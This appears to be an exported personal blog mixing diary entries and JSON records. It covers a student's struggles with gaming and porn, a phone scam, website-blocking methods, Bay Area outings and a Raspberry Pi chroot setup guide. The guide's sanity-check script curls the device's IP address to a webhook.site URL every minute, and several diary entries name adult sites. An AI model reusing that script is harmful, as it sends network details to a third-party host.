and self-sufficiency, I do believe that life is without its meanings, and I would rather prefer doing nothing than achieving anything.\n\n### Reflecting on the Previous Troubles I got into\n\nI got into encounters of trouble on the Internet during the ages of 16-17.\n\n1. Spamming messages on a military education website\n2. Cursing the teacher(in so-called anonymous platforms)\n3. Being alleged of cheating in competitive programming(helping out a teammate who constantly complains about not being able to read English to translate in Microsoft word, which is alleged \"cheating\" since Internet access isn't allowed, but the competition is online, which is complicated, and the person was only using Microsoft word)\n\nWell, the three situations share a common trait, which is it's on a proprietary platform and I was using shitty Microsoft. In short, by anonymizing myself on the Internet(obviously not believing in those so-called anonymous features after logging it????), probably using tor or several vpns or whatever, and switching to libretranslate if possible?(although I myself didn't have any problems with English but I \"guided\" a teammate to use shiity Microsoft Word for translating to Chinese, and the situation exploded and the whole school was banned because of this \"cheating\", although I didn't know about it in its rules)\n\nThat said, it definitely shouldn't be **me** to offer help on proprietary platforms like shitty Windows. I mean I can work literally seamless in probably all Linux distros and Rasp Pi, other other systems and cloud hosting and cloud gpus, and maybe half of Android and LineageOS platform problems, but proprietary platforms like shitty Windows is just not my taste. There are lots of powershell experts out there, who probably don't know what Linux is but are awfully proficient working on those proprietary platforms. Ask them for help. I won't provide anymore help on Windows, nor do I know how to use it aside from like browsing web? I can do nothing but mess up this crappy system.\n\nThat said, although my purpose of using Linux is KISS, being simple small secure whatever, Linux is certainly good for designing and suitable for someone who prefers heavy art. Just save the dot files or try to customize KDE Plasma for a MAC experience, or whatever. Doing those beauty is not my cup of tea, I prefer a simple intuitive desktop, period.\n\nI was a little paranoid after the situations, and started deleting social media accounts after that. As of now I pretty much deleted all my social media accounts except for necessary ones like WeChat and QQ. I usually have some extremist thoughts that could be categorized as inappropriate, other times I just natually wanted to do some experiments, like spamming messages, whatever. I can do whatever I want in like, a self-hosted platform like discourse or mastodon say whatever I want. I deleted like Instagram and Vkontakte accounts one year later. After all, I just want to be invisible for the proprietary platforms.\n\nAlso, another problem is that even if many people are saying inappropriate things, I shouldn't follow them because I might be more extreme.\n\nBack to the topic of judging whether these are moral. Firstly, spamming, I think, is moral if not explicitly against a platform's term of service. However, it's best to avoid those troubles, especially in Chinese platforms, since you need to do more than moral in this world. It is not my morals that stop me from doing many things, but instead, a way to avoid troubles. Secondly, I think cursing is not moral at all, given that cursing have no real effects and it's just, well bad. However, what the teacher did to my grades was clearly unfair, and, as a child at that time I couldn't do anything. Is that moral? I don't know, I mean, it is justifiable from the teacher's perspective, but it was still too much for me mentally to bear at that time. That said, I will probably go crazy if I go into some conscription or military camps or even in high school, I mean it, and there wasn't any helping at that time. So given my lack of mind and control, I think cursing people isn't such a big deal from my perspective, just don't do it on those school platforms, because if the school decides to take serious actions like expelling me it's just not worth it.\n\nThirdly, I do think my action is 100 percent moral and within the rules, and it is just that this competition is too crappy, and there were no rules being told beforehand, and I didn't go online intentionally. So it's best to avoid those stupid competitions after all if they are practically unoffical and useless. That said, there wasn't any helping to do for this thing, and I was lucky USTC didn't expell me, only letting me write a whole paper for the situation. I kept realizing that even if going to university is like a shitpile then USTC is probably the cleanest and most liberal ones among them.\n\n### Reflecting on the Telephone Fraud\n\nI remembered the telephone fraud that happened about 8 months ago. I am summarizing and reflecting on it.\n\n1. A person calls me claiming to be Chinese embassy person. He says I was involved in a fraud crime, and hope I could go there for a visit to clarify(I am annoyed), and I was going to class, and he asked to call me back a few minutes later\n2. He called me back, and claming something more serious, and claming I would be sent back to China. He asked to try letting a \"policeman\" talk on the phone for this matter.\n3. A \"policeman\" got on the phone, claiming he is \"official\" by changing some digits of the telephone number. (I believed and thought it was a little bit of trouble). Then he started talking to me for long hours about what I did and what consequences I would face(I actually nearly believed)\n4. He kept talking to me the same words again and again, and I got super scared. He then asked to use Skype, and asked for my bank credentials and id card number and passport number, which I told him. Essentially the scare is what got me. He had total control over me when I am scared. So, getting scared makes me vulnerable.\n5. I called my parents by excusing to go to bathroom, then my parents told me he was fraud, and I deleted him. In the end nothing was stolen, only I wasted a whole night.\n\nSome things to take in mind:\n\n1. Never admit to anything I didn't do. Be firm and learn to fight back mentally. Everyone knows I am innocent. Learn to fight the authority, this is critical for freedom. (even to policeman, don't treat them like shit).(never ever ever get involved to drug cartels or prostitutes or child porn or politics in real life, if I got involved then these crimes might actually be a reality, although for such news, I am still very curious into what exactly happened. The worst things I can do is probably throwing trash on the ground or improper citations or jaywalking)\n2. Stay to principles and don't download unnecessary softwares for other people. If necessary go use it on other machines. This is hardest, because, at my age such things are extremely stimulating to the mind.\n3. Never believe officials \"calling\"\n4. No one is prune to frauds! Always act with some caution(not necessarily so much but still don't act arrogant), and many frauds can't get to me\n\nSome thoughts about policeman:\n\n1. I never had one encouter with policeman in my life besides going to police station for id cards or something.\n2. Policeman are not authority, especially individual ones.\n3. Try complying if encoutered, but at least be mentally strong\n4. Policeman catch bad people. If I commit a serioud crimme I will probably be bought to justice, but in certain situations certain people commit certain crimes, which police chooses to ignore(although everybody knows)\n\nThat said, there are countless illegal acts in both China and America. Sensible police obviously browse the Internet and knows, but they don't catch the criminals, even if they know who they are.\n\nThis is probably because:\n\n1. criminals are cunning, justifying their acts in ridiculous ways\n2. criminals might have **certain** relationship to police\n3. police **just** doesn't catch these kind of crimes, (it is usually an action not encouraged and not that bad, although illegal, and police will try to handle those cases if they are explicitly reported or affecting a very large scale, but on individual cases police doesn't care)\n\nThere are other reasons I don't know. In conclusion as a sane citizen it is best for me to get away from politics, Winnie, drug cartels, prostitution, policeman, etc.\n\n### Buying Gifts or Sending Money to strangers\n\nI nor want to receive money or expensive gifts nor have the ability to send money or expensive gifts right now.\n\nAs you can see currently I am using my parents money, so beyond the basic living I have literally no money at all, which means anyone with money left in their purse is richer than me. In the futuer I plan to always buy phones less than 200 dollars(maybe with inflation go higher). Iphone is not attractive in any ways. It turns out the most luxurious thing I have is my laptop.\n\nSay I change laptop every 2 years, that probably adds around 50-100 dollar to my monthly budget.\n\nOther things I either inherit it from parents (which I will probably stop after a few years), or are very cheap, typically below 50 dollars. There is nothing as expensive as the laptop. The most expensive thing is about 1/20 the price of a pricey laptop(cheap laptops like chromebooks or ARM computers might be 300 dollars, but they aint optimal for daily driver). I can probably buy a 400-500 dollar computer if budget comes tight, which equates to 20 dollars a month if used 2 years, cheaper than a normal lunch in San Francisco.\n\nJust as you can see, right now I am in the state of being **feed** by my parents, which means my parents can determine how much money I have. My parents are **usually** generous, but it doesn't mean they will forever give money to me. After university I plan to not take any more from them. Literally this means all money I spent needs to be consented by my parents, what's more, pretty much everything I do would be consented by my parents. Although my parents are also generous about my decisions and giving pretty much full consent with default settings, I am still not free, kind of like I am not \"sudo\" user in my computer.\n\nOf course I need more money than a mere 500 dollars each month if I am to feed a family. It is better to have some emergency money in my hands. Also a child is far far more costly, and normally people have children at age 30(I don't know if I will though, or ever), also at around age 30 my parents go into 60s, meaning they probably will spend some money for health reasons.\n\nIt is obvious to save some budget, though I don't know how much is suitable. You can't save all money and not spend them, which is ridiculous. But it is highly unlikely I will have some money right now, and spending those few thousands of dollars(if I ever can earn) for a small-scale traveling seems pretty suitable.\n\nBut for right now at least, I am using my parents money, which makes sense not to send any money to anyone. I mean llike 10 or 20 RMB sometimes can be lost by accident occasionally, like if the metro stops for a day and using the taxi costs more than that. But only occasionally, and over 1000 RMB should be cautious when treating.\n\n### Motivation?\n\nWhat drives me forward? What makes my life meaningful?? Obviously not studying some crappy subject in school, right? But aren't I dependent on the diplomas? I am not free in this sense, where I depend on some shit to get my diploma, and had to study and work like a shit. However, I am still geniuely grateful for USTC, because, among the trashpile, you are the less annoying one. At least USTC helped me realize many things that otherwise I couldn't think of, and, in that sense, is some liberty,\n\nSorry for the selffishness but beyonds enhancing my life and gaining some sort of control over it there is no other purpose of life that I could think of. Some great people live in poor standards for many years, and it's probably not gonna happen for me. If I am going to live in those poor conditions, I would rather try to go in a better situation than being literally stuck. There isn't any meanings in your life if you die, and meanings diminish if your wellbeing diminishes. I am not dreaming of a person who have billions of dollars but needs to be in bed for covid every single day, till his death. There is no point in being poor in the first place.\n\nI think I am out of poverty right now, although being arrogant is against my philosophy. Anyways, I can probably freelance for 1 or 2 days a week and be self-sustained in lower ends towns and cities. I wouldn't give up the basic living conditions or my health for selflessness, for research, or for just anything, or anyone.\n\n### So it seems like loneliness was a problem after all?\n\nPlaying proprietary games, looking at unnecessary proprietary trash social media, watching adult videos, all of these, are these unavoidable?\n\nI thought loneliness could be handled without complaints but after all, it seems like a serious mental problems, seemingly with no ways to cope against.\n\nLoneliness leads to idealizing the society, and people around me.\n\nBut socializing seems so complicated and hard to implement, all at the same time? How did I not find some close friends through all those difficult years? Or, is it because I lost trust in seemingly everything, that I decided to, take a turn back towards the nighttime?\n\n\n\n\n\n\n\n\n\n## Updates February\n\n### Melancholy Night\n\nThis melancholy night reminds me again of the numerous occasions of beginning of semester scenario throughout my middle school career, and yet, even over the years, still lost and helpless am I.\n\nIt is a common practice to feel a little nostalgic, whilst when asked, do I want to return to the past? I would probably refuse.\n\nBack to the days where I would play video games for hours in the summer, then go to the library to try hard studying, making my own goals, trying to accomplish, afraid of schools yet it's always coming, going. Back to the days where in the final exam I would be so anxious and play video games the whole day before the afternoon exam at home, and fear the hear my scores. I would walk and dream of the world as mine, and with the lighest and purest heart, appreciate the beauty of the night-lights in the urban areas of Shanghai.\n\nI would make a comprehensive studying plan, only breaking down half way usually to go off playing video games. I would try to push myself forward, and read lots of literature, pretending they are of great knowledge. I would hope for the school to end, and dream of the future after middle school.\n\nI would go crying and exclaiming about the whole world around me, howling into the uttermost darkness, or the brighest summertime with sizzling sun, or just a mediocre spring day. I would ill at the loneliness, and long for a companion, yet seeing none my age. I would treat the external world the way I saw it around me, and naught the distractions on the Internet nor what's happening in the world would cause the slightest hint of thought. I had no idea, and so there is no bother.\n\nI lived the life of school day after day, as if it was of some importance and greatness. I was strict about the goods and bads, and I would start tackling those matters one by one. It was hard, yes, the uneasiness of puberty, the urge of sex, the sensitivity of the fragile mind. Yet, hard as it might, and ultimately, I would try shaping myself into the person I wanted, trying to strictly define the thing, and hope all the light in the future.\n\nSo I hoped, and I dreamed, and everything was shattered.\n\nIt wasn't until recently did I realize I lived in some kind of mockery nearly all my life, and naught did I know my purpose back then. I lived for other people, and it goes against my mind. My efforts weren't for my own purposes--they were forced. And thus, did this system crumble, and breaked were my mental mind and philosophy. This system simply leads nowhere, and nor did I know what to strive for. Ending in a difficult situation am I right now, and completely dazzled and frustrated, losting his way in the path going to nowhere.\n\n### External Brainwash vs Internal Control\n\nInternal Control is an inevitable method to gain control of myself over the external environment, while also restricting the mind. External Brainwash is the environment affecting the my minds and thoughts, causing (bad) influences.\n\nI don't care whether these are good or bad influences and it turns out they aren't all beneficial, and it is costing my freedom.\n\n### Control vs Brainwash\n\nBeing externally brainwashed is the worst thing that could ever happened, and I found that I was being brainwashed nearly all my life. I still don't have an idea about pretty much anything.\n\nI don't feel like being in control, and moreover, I feel desperate.\n\n### My Parents don't know nothing\n\nFollowing my parent's advice is really stupid act, and they only make me conform to their ideals.\n\nTurns out that their idea is outdated and nonapplicable.\n\nUndeniably my parents was doing well back in 20 or 30 years ago, and maybe even today in their own fields, but they know nothing about me.\n\n### Oh 2018 seems something of the past\n\nI remembered like in 2018 I was longing for my primary school? Fifth grade life? Whatever????\n\nAnyways, 2018 is something long gone now.\n\nI used to play youkia's pvzol though.\n\nOh, how time files, these years, I had barely had a grasp before things were turning wheels and flying.\n\n### How I had failed in controlling Gaming\n\nI couldn't control nothing in my life. Somehow I wished I would go for grad school here in USTC. I really don't mind it and also I am kind of having enough of this total nonsense of anxiety.\n\n### A Strange Dream\n\nYesterday, I dreamed back to high school again.\n\nFirst I went back to a dorm where people sleep in the same bedsheet, and it was super smelly. I wanted to get out, but couldn't, and thought that was the dorm I must facce in my high school.\n\nThere was the final exam, and I prepared really hard and thought I had tried my best for it. However, there was going to be an annoucement of Chemistry scores, and the same dreaded and creepy feeling came all over me again that it was gonna be really horrible.\n\nThen I thought for the millionth time which subjects do I choose. Precisely at that point I even lost account of the fact that I finished high school. I thought I'd choose physics and geology for sure, as 3 subjects were required, but then I needed to choose another among the Chemistry, Biology, History, and Politics, and I got super nervous and anxious.\n\nI thought back to choosing History for a moment before realizing how awful I performed on the subject, but there wasn't much other choices, since my Chemistry and Biology are much worse.\n\nThen I sort of faded back into unconsciousness, and woke up.\n\n### Why browser extension redirects doesn't work?\n\nYou either go on or you don't go on these websites. It is a conscious choice, and hard to confuse.\n\nIf you don't go on, fine, nothing is needed--you just actively go away from lures.\n\nIf you decides to go on, there is no stopping that action from a browser extension--simple.\n\nFurthermore a buggy browser extension offers far more disaster than this.\n\n### Dedication\n\nStudying requires lots of dedication, and no easy distractions.\n\n### Need to Work Harder\n\nI am seriously not putting in enough efforts for studying now. I need to work harder and push forward instead of falling back and gaming, no excuses. **###FocusStudying###StudyHarder###NoMoreExcuses**\n\n### Telegram still Impacting????\n\nSeriously Telegram is _JUST HARMFUL_ app full of illegal content, and they are consuming and not beneficial. So quit Telegram and embrace life!\n\n### NO NOTICE on GAMING\n\nI've said countless times that I need to stop freaking gaming. Gaming IS serious and it is really the main reason for lack of control. So value your freedom and stay away from the crap!\n\n### GIrl on Internet??\n\nWhy are you actually developing a crush over some prostitues you see in an adult video?? There are so many more beautiful girls in real life and these porn sluts, they are just UNSUITABLE for me?? It is both ridiculous and not logical at all to have such a strange thought.\n\nNever depend on someone else for my own life, and dominatrix is just a piece of shit?? Do you want to be masochist being played by another femdom? It's both ridiculous and completely piece of shit. Cherish your free life! Be sensible!\n\nAt the same time be sensible to never touch those porn people, or else having some sexual relationship might impact my whole life.\n\nI am not banning porn or sex but it is just too much, the level of emotions on watching adult videos.\n\nIn fact I am also imposing a ban on adult videos from now on. Adult video is officially banned, since it is too mentally disturbing.\n\n### CrappY Internet\n\nLIterally so many things on Internet is CRAP, and what's more, they are addictive and seriously affecting my mental wellbeing. Espeically those adult contents. Ahh, there is no way to completely get rid of them.\n\nCN Websites are also a piece of crap, with unusable buggy frontends and Winnie censoring.\n\n### Gaming IS TOXIC\n\n###FaceReality###NoMoreGames###RegainControl###EscapeTheGame###FuckGaming###Freedom\n\nNo more gaming, or else I will create a gaming Log.\n\n### How to ban a website and why excessive control sucks\n\nThere are several ways to ban websites\n\n1. Use family server plans like Cloudflare 1.1.1.3 (Blocking Malware and adult websites). Ineffective with VPN.\n\n2. Changing /etc/hosts file, very inefficient indeed, makes computer runs slowly when records go high(millions) since it goes through linear search. Ineffective when using a VPN.\n\n3. Using a squid proxy to route the traffic on another port, and config it globally.\n\nSquid is primarily used for caching and improving web performances, turning out it does improve performance on my computer, although not by much, only about less than 20%(probably because I am also behind ClashVerge vpn).\n\nAnyways, squid can be configed to block websites using external tools like squidguard or e2guardian. But still on the original port the traffic is not blocked.\n\n4. Using a VPN in the first place might block some websites, but these are usually blocked anyways in China. The point of VPN is usually browsing Internet freely, not for more restrictions.\n\nCloudflare Warp family works to block inappropriate websites, but it's too slow in China, since I needed to first connect to a US server.\n\n5. Using filter rules in ClashVerge vpn (or shadowsocks) blocks website. For example, if you block twitter then twitter will be inaccessible through the vpn, it is also inaccessible in Mainland China, so the site is blocked through the vpn. However, by simply changing a vpn provider one can still bypass.\n\n6. Trying browser extensions. Most ineffective way ever. One can easily bypass by installing another browser. Some browser, like qutebrowser, doesn't support extensions.\n\n7. Trying some parental control software. Extremely bad way. Firstly, those softwares are often complicated to set up, often with much configuration and \"gui\", which is probabaly the last thing I will try. Furthermore, these softwares complicates the monitoring and censoring, making I feel very uncomfortable, against the point of trying to achieve freedom and comfort through filtering evil websites. Moreover, they eat up system cpu usage and network speed. Lastly, most are ineffective, and may be bypassed by VPN easily.\n\n8. Be \"below 18 years old\" on Internet. This isn't a method in the first place since although Google search won't return malicious results for children, most malicious(adult) websites doesn't need confirming to enter.\n\n9. Try dropping the iptables.\n\n```sh\n[user ~]\\dollar sudo iptables -I OUTPUT 1 -d 104.21.68.184 -j DROP\n[user ~]\\dollar sudo iptables -I OUTPUT 1 -d 172.67.197.209 -j DROP\n```\n\nIneffective over VPN.\n\nIn conclusion it is quite hard to block harmful websites without extensive and a very long time configuration and extensive testing, which is far less time-efficient than normal things to do. Anyways, the main goal is the block inappropriate content, and if browsing inappropriate content is my own will, then I must be responsible for it. There are millions of inappropriate websites in minimum, with more going out everyday. It is almost impossible without a \"GUI\" or extensive monitoring software for offering such a service effectively.\n\n### What I shall focus preventing on right now?\n\nThere are several pretty serious issues to be addressed. Typically\n\n1. Never ever play video games\n2. Never ever go on those cn spam platforms\n\nThese ARE causing troubles for me right now, also so is my sleeping schedule, but anyways, sleepoing schedule can be adjusted, but these things are such a pain.\n\nIf I go on tieba for once I will be addicted with the shit.\n\n### Some previous erros in my website development\n\nI made some pretty ridiculous erros before, for example, I used 2 domains and 2 linode vps for frontend and backend. This can be utilized by using nginx proxy on one Linode machine and configuring a path for the backend.\n\nI also constantly ran `sudo npm start` for my website, which is quite stupid. I shall run `npm run build` for production builds.\n\n### What kind of woman do I want to marry?\n\nSomething about me; I aim for freedom and control. This is unnegotiable.\n\nI mean, for people who do not care about their freedom, it's absolutely fine to be friends with them, but to have a spouse to live with like 50 years, it is kind of deeply troublesome.\n\nWhen I see a girl I immediately release some kind of chemical that makes me excited or what, then I started to think about like being together with this girl, and possibly marrying. But it is very ridiculous thinking, anyways, even if she wants to marry me, will I agree?\n\nI do hope to find someone who is also independent and free-willed, and we can negotiate on other things. But seeing some pretty girls taking, well that really made me not like them anymore.\n\n### Money Spending\n\nI had become very conservative at money spending.\n\n- **Autocharging**\n\nFirstly, I just feel bad with \"autocharging\". This feature derives me of control over my money. I am not someone with extremely good memories, so usually I tend to forget about it. Look, I know it is cheap and not a lot of money or something but it still makes me feel very bad. And lately a scam website called anphlp charged me 26 dollars, which I think came from me signing up for streaming on a scam website with my card.\n\n- **Just Feeling Bad :(**\n\nSecondly, I just feel bad about people taking my money at all. I mean, like to be honest, Google and YouTube deserves to charge me some money since I am using so much searching and watching so much video, without spending a cent. Think about YouTube's spendings on its cdns. And Google's search is on its own platform, and performs in its own cloud, which makes more sense if they charge me.\n\nAnyways I just don't feel like spending any money on websites, they don't give much shit, though. Websites are essentailly programs with a frontend, pretty much anything I can run locally with Aur repos.\n\nI think Linode is ok to charge me five dollars for renting their stable cloud services, so is other cloud providers. But watching a video or movie is nonfree? Using some crap like veed? Oh come on, who wants to watch it anyways?\n\n- **Enough Free Alternatives**\n\nThere are millions of free hosting websites that you can stream almost anything or download it. Even porn videos are hosted everywhere. Like straplez videos are hosted on pornhoarder.tv and xfantazy. Other sites with lots of porn videos include like spankbang, noodlemagazine, videosection, etc. By a click I can find almost everything I would want to watch.\n\nI saw on RuTube a channel like marked with 18+, which immediately got my interest, things like European Brazzers. But I searched on Google and I could go on another site to watch these for free. And they are actually pretty boring, like those mediocre (not even high-quality) porn videos poorly stacked together. Why would I take the time to freaking watch those stupid porn channels.\n\nI do acknowledge there are some high-quality videos that needs charging, but anyways, I do not watch videos for a living, and thus I don't really care about the quality if there are similar alternatives. Watching a football match and watching a basketball match seems pretty much same to me anyways.\n\n- **Parents' Money**\n\nAnyways, last and most significant factor is that I am spending my parents' money, which means I have to keep total track of everything. It's not like my parents asked me to do so or something, although they obviously did. It's like just a custom that when like depending on other people you need to keep track of your doings. Depending on my parents' now is the worst thing that can ever happen to me, but there isn't much more ways to earn moeny myself anyways.\n\n### Conclusion on Saving Money\n\nAlso saving money doesn't necessarily make me better or feel good, but overspending money do make me feel really bad. Like especially when overspending for not valuable stuffs.\n\n\n\n\n## Updates December\n\nI'm genuinely grateful for the extraordinary kindness and assistance I received from an airport worker in San Francisco. I was too tired and didn't pay much attention to booking the plane ticket. I having booked a ticket that required a transfer in Canada without the necessary ETA.\n\nI was extremely lucky to meet a wonderful airport employee. She even appeared to be interested in my studies. She was so approachable and chatted with me for a while. She said, \"Don't worry, just wait here with me,\" and it brought immense comfort. She tried to reroute my luggage directly to Shanghai, which that didn't work out, and she just somehow worked out to give me a direct flight to my destination.\n\nNow, I am filled with deep gratitude. The kindness and help of this airport worker left a lasting impression!. She reminded me of the kindness and empathy in a time of despair. I'm sincerely thankful for her help and the positive impact she had on my journey.

{"$date": "2023-10-27T01:15:00Z"}, "type": "journal", "access": 1, "body": "Today I visited Ocean Beach.\n\nI was in a very bad mood and distorted these days. I couldn\\'t get any\nwork done and think about living in remote settings like in Northern\nEurope or Alaska or New Zealand daily.\n\n## Eating Dinner\n\nI hopped on a Bart and went to Mission district. It is very crowded\nthere with homeless people everywhere. I looked around and bought a\nburrito for my dinner.\n\n## Taking Bus\n\nThen I walked around, and it was a steep hill up the road. I took the\nbus.\n\nI could see the sun setting and it was very beautiful, but when I took\nout my phone to take a picture the bus moved, and the buildings blocked\nthe sun. I never saw the sun again. Then I thought like how days pass,\nand they never go back, and suddenly this year is ending, and so is my\nexchange program in UC Berkeley. I felt very very empty inside, and felt\nmy incapability to handle things these days.\n\n## Arriving at Ocean Beach\n\nThe bus took forever and went down and up a lot of hills. I sit in the\nmost remote corner and played with my phone, watching lots of people\ngetting up and down the bus.\n\nThen I arrived in Ocean Beach, and it was already dawn. I could mildly\nsee the some golden clouds in the end of the horizon.\n\nLast time I went here was in January, and I went here with my parents.\nBut unfortunately the car broke down, and it was very very sad. It was\nalso raining hard that day, and we ended up going nowhere. Then I\nthought maybe I missed my parents now.\n\nThen I thought how fast time had passed since January, and I felt voided\nand eaten up by this.\n\n## Going Along the Beach Trails\n\nSo I went out and walked down the beach, and started walking down the\nbeach trails. There were few people scattered along the beach trails.\nThere were also some dogs, running freely around. I started running,\nuntil I was out of breath, then I started running again. The beach is\nsuch a good place for running, as fresh air filled my lungs all the time\nin the vast open.\n\nThen I kept walking, and the sky became dimmer. There was hardly any\nlights in the distance. I felt isolated from the world and it was very\ngood feeling. The city seemed remote, and after a while I saw no people.\nI seemed to be walking all alone surrounded by the sea. I haven\\'t seen\nthe ocean much since coming here, instead, I think this is only the\nsecond time since January that I seen the ocean. I could only see the\nBay in Berkeley.\n\nI felt very melancholy.\n\n## Turning Back\n\nI went about 1 mile when it really became dark, and I couldn\\'t even see\nthe beach clearly, so I turned back. I was even a little afraid. Night\nhere is so different from daytime. There was no roads leading out of the\nbeach so I had to climb the slippery sand.\n\nI quickly found a place to climb out and walked to Upper Great Highway.\n\n## Going around at night\n\nGoing around at night is always not interesting here. I went to\nLafayette some days ago at around 7 pm and there wasn\\'t anything to see\nat night. It is the same with West San Francisco. I hadn\\'t thought San\nFrancisco would be this big and thought it would be well lit like\nShanghai at night. I was wrong.\n\n## Going back home\n\nI seemed to be going nowhere, and I felt very thirsty, so I tried to bu\nsome water. I walked past Sunset Boulevard. Then I bought some water and\njuice, and took the Lyft back home.\n\n## Conclusion\n\nSan Francisco beach is very beautiful, but it isn\\'t very accessible\nfrom Berkeley, as it took me 2 hours to go there. If the beach is behind\nthe school (like UCSD), that would be much better. I felt very much\nempty inside these days, and felt no interest other than tinkering\naround with Gnome.\n\n![](https://cdn.jimchen.me/e4b5953d-6109-48ed-be08-dfb830381762)\n\n![](https://cdn.jimchen.me/4a500189-be43-403e-bd2f-ada9058b3b03)"}, {"_id": {"$oid": "66ebe945f24e7c3e85e8deae"}, "title": "Visiting Concord", "date": {"$date": "2023-10-23T17:20:00Z"}, "type": "journal", "access": 1, "body": "Today I went to Concord, not the Concord near Boston where I had been to in the summer of 2016, but the one at the north of the Bay area.\n\n## Bart Station Gateway\n\nIt was a warm radiant sunny day when I walked out of the bart station. I walked on Clayton Road and it was very nice.\n\nThere are distinctive black road signs on the streets, and the homes looks very beautiful and classic.\n\n## Food at Galindo Street\n\nI went to Galindo Street for lunch, and had a delightful meal at a restaurant called \"Ramen.\"\n\n## Amusement Park\n\nAfter lunch I looked at Google Map and thought about next destination, eventually going to Amusement Park. The main roads are filled with vehicles, in stark contrast of the quiet roads nearby.\n\nThe park had only one other visitor but there was a group of geese, and they moved synchronously. Then I thought about a geese school, and it was truly enchanting.\n\n## Port Chicago Highway\n\nI went northward up to Port Chicago Hwy. The road got much worse after Panoramic Road, with no pavements and speeding cars zooming past. There was a strange person in the middle of the street near the California Delta Highway, and I quickly had to cross the street, going to the better developed side of the road.\n\nGoing past the California Delta Highway, there was an expansive golf course, a large place dotted with ponds and trees. it is very beautiful, but there was \"No Public Access\" sign right there. I thought about the idea of changing this to a public park.\n\n## Industrial Park\n\nI tried to go to the Reservoir via Bates Avenue. However, the journey was very unpleasant. I walked into an Industry Park. The pavements are unconstructed and there is constant loud roar of vehicles going by. I only walked one mile but it was very tiring. I finally saw the Reservoir, with its deep blue waters and the distant mountains. Unfortunately, it was also closed to the public.\n\nThen I was finding myself in the middle of the industrial park, and felt weary and disoriented. I decided it was time to go home. I saw a barefoot person on the street that looked queer. Anyways, I wasn't in the mood of going anywhere further and called a lyft to the Bart Station to go home.\n\n## Reflections\n\nConcord's downtown areas seem good, but the industrial park is no place for a leisure walk. I should better plan for future visits and perhaps utilize a car for better exploration, focusing more on the scenic spots."}, {"_id": {"$oid": "66ebe945f24e7c3e85e8deaf"}, "title": "Setting Up Raspberry Pi OS", "date": {"$date": "2023-10-21T23:09:00Z"}, "type": "linux", "access": 1, "body": "## Introduction\n\nSetting up and configuring Raspberry Pi OS can be a streamlined process by using chroot on a different machine. This guide will walk through the steps to prepare your Raspberry Pi SD card on a laptop, eliminating the need for direct access to the Raspberry Pi during the initial setup. By the end of this guide, you'll have a fully configured Raspberry Pi OS with network settings, a working SSH connection, and optional proxy configurations (also for users in Mainland China).\n\n## Why Chroot?\n\nChrooting is a very easy way to configure an sdcard, and I just don't like the idea of a desktop environment on Raspbery Pi, which complicates things.\n\nChroot is very powerful, and there are certain limitations(for example, not able to `sudo` or start a `systemd` service inside chroot)\n\n## Install Qemu\n\nThis is necessary for chrooting the sdcard on my laptop\n\n`sudo apt install qemu-user-static`\n\n## Copy Necessary Files\n\nBefore configuring the Raspberry Pi, we need to copy some essential files to the target file system. This allows for chrooting(since the laptop is usually x86 and the rasp pi is usually `arm`, and we need the resolve conf to have network connection. These files include `qemu-aarch64-static` and `resolv.conf`.\n\n```bash\n# Copy the QEMU executable to simulate the ARM processor in the Chroot environment\nsudo cp /usr/bin/qemu-aarch64-static /media/user/rootfs/usr/bin/\n\n# Copy the DNS configuration file to ensure proper network connection\nsudo cp /etc/resolv.conf /media/user/rootfs/etc/resolv.conf\n```\n\n## Mount File Systems and Enter Chroot Environment\n\nMounting the file systems and entering the Chroot environment allows us to perform configuration operations in the target system.\n\nMount the `/dev /proc /sys` directories to access devices, processes, and system information in the Chroot environment.\n\n```bash\n# Mount the /dev directory\nsudo mount --bind /dev /media/user/rootfs/dev\n\n# Mount the /proc directory\nsudo mount --bind /proc /media/user/rootfs/proc\n\n# Mount the /sys directory\nsudo mount --bind /sys /media/user/rootfs/sys\n\n# Enter the Chroot environment\nsudo chroot /media/user/rootfs /bin/bash\n```\n\n## Modify Source List\n\nTo speed up package downloads, change the default software sources to local mirrors.\n\n```bash\n# Replace the default Raspberry Pi software sources with USTC mirrors\nsudo sed \\\n  -e 's|http://archive.raspberrypi.org|http://mirrors.ustc.edu.cn/raspberrypi|g' \\\n  -e 's|http://archive.raspberrypi.com|http://mirrors.ustc.edu.cn/raspberrypi|g' \\\n  -i.bak \\\n  /etc/apt/sources.list.d/raspi.list\n\n# Replace Debian software sources with USTC mirrors\nsudo sed -i 's/deb.debian.org/mirrors.ustc.edu.cn/g' /etc/apt/sources.list\n\n# Update and upgrade packages\napt update && apt upgrade\n```\n\n## Unmount File Systems\n\nAfter completing the configuration, unmount the previously mounted file systems.\n\n```bash\n# Unmount /dev, /proc, and /sys directories\nsudo umount /media/user/rootfs/dev /media/user/rootfs/proc /media/user/rootfs/sys\n\n# Unmount the root file system\nsudo umount /media/user/rootfs\n```\n\n## Adding the Wifi Service\n\nAfter chrooting, I can run commands now.\n\nI add the wifi service to automatically connect to Berkeley Eduroam. So\nI add a service `/etc/systemd/system/connectwifi.service`\n\n```service\n[Unit]\nDescription=Connect to BerkeleyEduroam\nAfter=network.target\n\n[Service]\nType=oneshot\nExecStartPre=/bin/sleep 30\nExecStart=/usr/local/bin/connectwifi.sh\nRemainAfterExit=yes\n\n[Install]\nWantedBy=multi-user.target\n```\n\nWhere the connect wifi script(add the appropriate wifi)\n\n```sh\nnmcli connection delete ''\n\nnmcli con add con-name '' \\\nifname wlan0 \\\ntype wifi \\\nssid '' \\\nwifi-sec.key-mgmt wpa-psk \\\nwifi-sec.psk ''\n\nnmcli con up ''\n```\n\n## Adding a Sanity Check\n\nI need to get the ip address for ssh, because when I tried using nmap to find the ip to ssh into it returned dozens of\naddresses and I couldn't find the appropriate one.\n\nTo make a sanity check to see if Rasp Pi is connected to wifi, I added\nanother service, I post the ip address online every minute\n\n```service\n[Unit]\nDescription=Send notification to webhook.site\nAfter=network-online.target\nWants=network-online.target\n\n[Service]\nType=oneshot\nExecStart=/usr/local/bin/send_webhook.sh\n\n[Install]\nWantedBy=multi-user.target\n```\n\nI used webhook, and the script\n\n```bash\n#!/bin/bash\n\nIP_ADDRESS=$(ip addr show wlan0 | grep \"inet\\b\" | awk '{print $2}' | cut -d/ -f1)\n\ncurl -X POST https://webhook.site/da5810be-d59c-4746-962e-bccd2a778cc3 -d \"ip=$IP_ADDRESS\"\n```\n\n## Configure Passwords\n\nThen configure the password of user `pi`.\n\n## `ssh`\n\nAfter setting up the network to start default at boot, I could ssh into\nit from the same network. `ssh pi@10.40.88.225`\n\n## Using Clash\n\nThis is only needed in Mainland China to bypass the firewall.\n\nDownload the Clash executable file and transfer it to the Raspberry Pi. Clash is a multi-platform proxy 